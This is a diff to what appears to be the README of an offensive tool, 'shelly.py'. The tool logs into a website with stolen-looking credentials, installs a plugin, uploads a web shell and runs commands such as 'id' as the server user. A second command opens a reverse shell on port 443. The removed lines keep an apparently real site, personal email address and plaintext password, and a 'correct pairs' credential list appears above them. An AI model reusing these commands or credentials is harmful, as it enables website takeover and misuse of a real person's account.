@@ -31,7 +31,7 @@ All correct pairs:
 {'xxxxxxxxxxxxx@icloud.com': 'xxxxxxxxxxxxx', 'xxxxxxxxxxxxx@gmail.com': 'xxxxxxxxxxxxx'}
 ```
 ```
-python shelly.py -t "http://www.snarlsburg.com" -u "esteban.m.rodriguez@gmail.com" -p "Y85@j0l4cFP@254c" -i
+python shelly.py -t "http://www.[website].com" -u "[username]@gmail.com" -p "[password]" -i
        ,-~~-.___.       __        __ ____   _____
       / |  x     \      \ \      / /|  _ \ |  ___|___   _ __  ___  ___
      (  )        0       \ \ /\ / / | |_) || |_  / _ \ | '__|/ __|/ _ \.
@@ -51,12 +51,12 @@ Plugin installed successfully
 Upload Directory: xhtnhgo
 os-shell> id
 Sending command: id
-uid=4812176(dom.snarlsburgcom) gid=15010(cgiuser) groups=15020,15010(cgiuser)
+uid=4812176(dom.[website]) gid=15010(cgiuser) groups=15020,15010(cgiuser)
 
 os-shell> 
 ```
 ```
-python shelly.py -t "http://www.snarlsburg.com" -u "esteban.m.rodriguez@gmail.com" -p "Y85@j0l4cFP@254c" -lp 443 -li 10.0.0.0 -r
+python shelly.py -t "http://www.[website].com" -u "[username]@gmail.com" -p "[password]" -lp 443 -li 10.0.0.0 -r
        ,-~~-.___.       __        __ ____   _____
       / |  x     \      \ \      / /|  _ \ |  ___|___   _ __  ___  ___
      (  )        0       \ \ /\ / / | |_) || |_  / _ \ | '__|/ __|/ _ \.
